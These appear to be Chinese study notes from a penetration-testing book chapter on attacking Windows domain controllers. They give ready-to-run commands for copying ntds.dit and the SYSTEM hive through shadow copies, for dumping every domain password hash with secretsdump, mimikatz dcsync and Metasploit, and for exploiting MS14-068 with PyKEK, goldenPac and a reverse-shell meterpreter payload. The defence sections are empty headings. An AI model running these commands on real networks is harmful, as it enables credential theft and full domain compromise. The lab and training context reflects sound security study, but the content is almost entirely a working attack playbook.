# 6 域控制器安全
## 6.1 使用卷影拷贝服务提取ntds.dit
> 卷影拷贝服务(Volume Shadow Copy Service,VSS),本质属于"快照",用于备份和恢复
> ntds.dit,二进制文件,存储在与控制器的%systemroot%\ntds\ntds.dit,包含用户名,散列值,组,GPP,OU等与活动目录相关的信息,与SAM一样处于被锁定状态
### 6.1.1 通过ntdsutil.exe提取ntds.dit
> 默认安装在域控制器上,可以在域控制器上直接操作,也可以通过域内机器在与控制器上远程操作,支持windows server 2003,2008,2012
> 为活动目录提供管理机制的命令行工具
```cmd
//在域控制器的命令行环境下输入如下命令,创建一个快照,该快照包含windows中的所有文件,且在复制文件时不会收到windows锁定机制的限制
ntdsutil snapshot "activate instance ntds" create quit quit
//加载刚刚创建的快照(GUID),将快照加载到系统中
ntdsutil snapshot "mount {GUID}" quit quit
//使用copy命令将快照中的文件复制到c:\temp\ntds.dit
copy C:\快照加载成功的目录\windows\ntds\ntds.dit c:\temp\ntds.dit
//卸载并删除之前加载的快照
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit
//查询当前系统中的所有快照
ntdsutil snapshot "List ALL" quit quit
```
### 6.1.2 利用vssadmin提取ntds.dit
> 支持windows server 2008和windows7
> 可创建和删除卷影拷贝,列出卷影拷贝的信息(只能管理系统Provider创建的卷应拷贝),,显示已安装的所有卷影拷贝写入程序(writers)和提供程序(Providers),以及改变卷影拷贝的存储空间(diff空间)的大小
```cmd
//创建一个C盘的卷影拷贝
vssadmin create shadow /for=c:
//在创建的卷影拷贝中将ntds.dit复制出来
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:ntds.dit
//删除快照
vssadmin delete shadow /for=c: quiet
```
### 6.1.3 使用vssown.vbs脚本提取ntds.dit
> 可创建和删除卷影拷贝,启动和停止卷影拷贝
```cmd
//启动卷影拷贝服务
cscript vssown.vbs /start
//创建一个C盘的卷影拷贝
cscript vssown.vbs /create c
//列出当前的卷影拷贝
cscript vssown.vbs /list
//删除卷影拷贝
cscript vssown.vbs /delete {ID}
//复制ntds.dit
copy \\list列出的卷影拷贝地址\windows\NTDS\ntds.dit c:\ntds.dit
```
### 6.1.4 使用ntdsutil的IFM创建卷影拷贝
> 使用ntdsutil创建IFM时,需要进行生成快照,加载,将ntds.dit和计算机的SAM文件复制到目标文件夹中等操作,这些操作也可以通过wmi或powershell远程执行
在域控制器中以管理员模式打开命令行环境
```cmd
ntdsutil "ac i ntds" "ifm" "create fyll c:/test" q q
//然后将ntds.dit复制到c:\test\Active Directoy\文件夹下(命令省略)
//然后将system和security两项复制到C:\test\registry\文件夹下(命令省略)
//将ntds.dit拖回本地后,在目标机器上将test文件夹删除
rmdir /s/q test
```
在Nishang中有一个powershell脚本Copy-VSS.ps1.将该脚本提取出来,在域控制器中打开一个powershell窗口,然后输入如下命令,导入并执行该脚本
通过该脚本,可以将SAM,SYSTEM,ntds.dit复制到与该脚本相同目录中
```powershell
import-module .\cpoy-vss.ps1
copy-vss
```
### 6.1.5 使用diskshadow导出ntds.dit
> 微软签名的,windows server 2008,2012,2016默认自带(c:\windows\system32\)
> 交互式(需登录远程桌面,图形化管理界面)和非交互式两种模式
```cmd
//列出帮助信息
diskshadow.exe /?
//可以用来执行命令
//将需要执行的命令"exec c:\windows\system32\calc.exe"写入文本文件"c:\command.txt"
diskshadow /s c:\command.txt
```
+ diskshadow导出ntds.dit
> 必须将当前与控制器的执行shell的路径切换到c:\windows\system32 
1.将如下命令写入一个文本文件,command.txt
```cmd
//设置卷影拷贝
set context persistent nowriters
//添加卷
add volume c: alias someAlias
//创建快照
create
//分配虚拟磁盘盘符
expose %someSlias% K:
//将ntds.dit复制到C盘中
exec "cmd.exe" /c copy k:\windows\NTDS\ntds.dit c:\ntds.dit"
//删除所有快照
delete shadow all
//列出系统中的卷影拷贝
list shadow all
//重置
reset
//推出
exit
```
2.使用diskshadow.exe直接加载这个文本文件
```cmd
//切换当前的shell路径
cd c:\windows\system32
//执行命令
diskshadow /s c:\command.txt
```
3.导出ntds.dit后,可以将system.hive转储,因为system.hive中存放这ntds.dit的密钥,如果没有该密钥,将无法查看ntds.dit中的信息
`reg save hklm\system c:\windows\temp\system.hive`
> 可以在非特权用户的权限下使用部分的diskshadow功能
> 在使用diskshadow导出ntds.dit时,可以通过WMI对远程主机进行操作
> 在使用diskshadow导出ntds.dit时,必须在c:\windows\system32\中操作
> 脚本执行后,要检查从快照中复制出来的ntds.dit文件的大小,如果文件大小发生了改变,可以检查或修改脚本后冲行执行 
### 6.1.6 监控卷影拷贝服务的使用情况(291页)
## 6.2 导出ntds.dit中的散列值
### 6.2.1 使用esedbexport恢复mtds.dit
> kali2.0下
+ 导出ntds.dit
```shell
//下载安装esedbexport(292页,命令略)
//进入存放ntds.dit的目录
//提取表信息,本实验中只需要其中的datatable和link_table,结果在同目录新生成的文件夹下
esedbexport -m table ntds.dit
``
+ 导出散列值
​```shell
//下载.ntdsxtract
git clone https://github.com/csababarta/ntdsxtract.git
//安装ntdsxtract
python setup.py build && python setup.py install
//将导出的ntds.dit.export文件夹和SYSTEM文件一并放入ntdsxtract
//将域内的所有用户名及散列值导出到all_user.txt
dsuser.py ntds.dit.expore/datatable.3 ntds.dit/export/link_table.5 output --sysshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt
```
+ 导出域内信息
> ntds.dit包含域内的所有信息
```shell
//导出域内所有计算机的信息
python dscomputers.py ntds.dit.export/datatable.3 computer_output --cscoutfile all_computers.csv
```
### 6.2.2 使用impacket工具包到处散列值
> impacket工具包中的secretsdump也可以解析ntds.dit
```shell
//下载安装impacket(kali自带)
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
//通过用户名和散列值进行验证,从远程与控制器中读取ntds.dit并转储域散列值
impacket-secretsdump -hashes 哈希值 -just-dc pentest.com/administrator@192.168.100.205
``
### 6.2.3 在Windows下解析ntds.dit并导出域帐号和域散列值
+ NTDSDumpex.exe
​```cmd
//将ntds.dit,SYSTEM,和NTDSDumpex.exe放在同一目录下
NTDSDumpex.exe -d ntds.dit -s system
```
## 6.3 利用dcsync获取域散列值
### 6.3.1 使用mimikatz转储域散列值
> 域管理员权限
> mimikatz的dcsunc功能,利用卷影拷贝服务直接读取ntds.dit文件
```cmd
//域内的任意一台机器上,使用域管理员权限打开命令行
//导出域内的所有用户名及散列值
lsadump::dcsync /domain:pentest.com /all /csv
//导出指定用户的散列值
lsadump::dcsync /domain:pentest.com /user:用户名
//也可以直接在域控制器中运行mimikatz,通过转储lsass.exe进程对散列值进行dump操作
privilege::debug
lsadump::lsa /inject
//如果用户数量太多,mimikatz无法完全将其显示出来,可以先执行log命令(会在mimikatz目录下生成一个文本文件,用于记录所有执行结果)
```
### 6.3.2 使用dcsync获取域帐号和域散列值
+ Invoke-DCSync.ps1
`Invoke-DCSync -PWDumpFormat`
## 6.4 使用metasploit获取域散列值
+ psexec_ntdsgrab模块的使用
`auxiliary/admin/smb/psexec_ntdsgrab`
+ 基于meterpreter会话获取域帐号和域散列值
`post/windows/gather/credentials/domain_hashdump`
## 6.5 使用vshadow.exe和QuarksPwDump.exe导出域帐号和域散列值
> 适合域控制器上没有杀软,直接在域控制器中到处ndts.dit并获取域帐号和域散列值
> quarkpwdump可以快速,安全,全面的读取全部域帐号和域散列值,github开源
> shadowcopy是一款免费的增强型文件复制工具,使用微软的卷影拷贝技术,能够复制被锁定的文件及被其它程序打开的文件
> vshadow是从windowsSDK中提取出来的,可生成快照
1. 将全部文件放入domainhash文件夹中
2. 在shadowcopy.bat中设置工作目录为c:\windows\temp\
3. 执行shadowcopy.bat脚本,结果会在刚刚设置的工作目录下存放导出的ntds.dit和hash.txt
+ 本地破解散列值
	+ Cain
	+ LC7
	+ Ophcrack
	+ SAMInside
	+ Hashcat
+ 在线破解(NTLM Hash)
## 6.6 kerberos域用户提全漏洞分析与防范(303页)
> ms14-068 CVE-2014-6324  WINDOWS SERVER 2003 --- 2012 R2
> 在域内,知道任意域用户的用户名,SID,密码,即可将用户权限提升至与管理级别
### 6.6.1 测试环境
+ 域 :pentest.com
+ 域帐号 :user1/Aa123456@
+ 域SID :S-1-5-21-3112619480-1751665795-4053538595-1104
+ 域控制器 :WIN-2K5J2NT2O7P@pentest.com
+ kaliIP :172.16.86.131
+ 域机器的IP :172.16.86.129
### 6.26.2 PyKEK工具包
>PyKEK(python Kerberos Exploitation Kit)是一个利用kerberos协议进行渗透测试的工具包
>使用pykek可以生成一张高权限的服务票据,通过mimikatz将服务票据注入内存
+ 工具说明
ms14-068.py是pykek工具包中的ms14-068漏洞利用脚本
|参数|说明|
|----|----|
|-u <username>@<domainname>|用户名@域名|
|-s  <userSID>|用户SID|
|-d  <domainControlerADDr>|域控制器地址|
|-p <clearpassword>|明文密码|
|--rc4 <ntlmHash>|在没有明文密码的情况下使用NTLMHash登录|
+ 查看域控制器的补丁安装情况
> ms14-068 CVE-2014-6324补丁号为KB3011780
`wmic qfe get hotfixid`
+ 查看用户的SID
```cmd
whoami /user
//获取域内所有用户的SID
wmic useraccount get name.id
```
+ 生成高权限票据
> 可步骤可以在任意机器上生成,此处是在kali中生成
使用pykek生成高权限票据,会在当前目录下生成一个名为"TGT_user1@pentest.com.ccache"的票据文件
```cmd
//命令格式
ms14-068.exe -u 域成员名@域名 -s 域成员SID -d 域控制器地址 -p 域成员密码 
//针对本次实验
python ms14-068.py -u user1@pentest.com -s S-1-5-21-3112619480-1751665795-4053538595-1104 -d 172.16.86.130 -p Aa123456@
```
+ 查看注入前的权限
在一台域内机器上,此处是windows server 2008
`dir \\WIN-2K5J2NT2O7P\c$`	//当前无法列出域控制器的C盘目录
+ 清除内存中的所有票据
```cmd
//运行mimikatz
mimikatz
//清除内存中的所有票据
kerberos::purge
```
+ 将高权限票据注入内存
将票据文件复制到windows2008机器的mimikatz目录下,使用mimikatz将票据注入
```cmd
mimikatz
//注入票据
kerberos::ptc "TGT_user1@pentest.com.ccache"
```
+ 验证权限
`dir \\WIN-2K5J2NT2O7P\c$`	//可以列出与控制器的C盘
### 6.6.3 goldenPac.py
> goldenPac.py是一个用于对kerberos进行测试的工具,集成在impacket工具包中,在impacket-master/examples目录下
+ 命令格式
`python goldenPac.py 域名/域成员用户:域成员用户密码@域控制器`
+ 安装kerberos客户端
> kali中默认不包含kerberos客户端
`apt-get install krb5-user -y`
+ 配合psexec获取域控制器的shell
`python goldenPac.py pentest.com/user1:Aa123456@WIN-2K5J2NT2O7P@pentest.com`
> 由于是通过psexec,会产生大量日志,psexec已被列为危险文件
### 6.6.4 在metssploit中进行测试
`auxiliary/admin/kerberos/ms14_068_kerberos_checksum`
exploit此模块,会生成一个.bin文件,metasploit不支持bin文件导入,需要先使用mimikatz对文件进行格式转换,会转换成一个.lirbi文件
`kerberos::clist ".bin文件" /export`
获得一个域内机器的meterpreter
```shell
load kiwi
//然后输入转换后的票据文件
background
msf5 > use exploit/windows/local/current_user_psexec 
msf5 exploit(windows/local/current_user_psexec) > set TECHNIQUE PSH
TECHNIQUE => PSH
msf5 exploit(windows/local/current_user_psexec) > set RHOSTS WIN-2K5J2NT2O7P@pentest.com
RHOSTS => WIN-2K5J2NT2O7P@pentest.com
msf5 exploit(windows/local/current_user_psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/current_user_psexec) > set LHOST 192.168.86.135
LHOST => 192.168.86.135
msf5 exploit(windows/local/current_user_psexec) > set session 1
session => 1
msf5 exploit(windows/local/current_user_psexec) > exploit 
```
### 6.6.5 防范建议(310页)